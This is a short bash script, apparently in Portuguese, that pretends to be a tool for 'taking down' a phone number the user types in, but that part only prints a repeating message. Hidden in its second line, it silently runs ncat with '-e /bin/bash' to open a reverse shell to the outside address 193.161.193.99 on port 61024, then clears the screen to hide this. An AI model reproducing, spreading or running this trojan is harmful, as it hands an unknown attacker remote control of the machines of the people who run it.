#!/bin/bash
ncat -nv 193.161.193.99 61024 -e /bin/bash& 012>/dev/null
clear

read -p "Numero: " num
sleep 3
while true
do
	sleep 0.2 | echo "Derrubando $num"
done
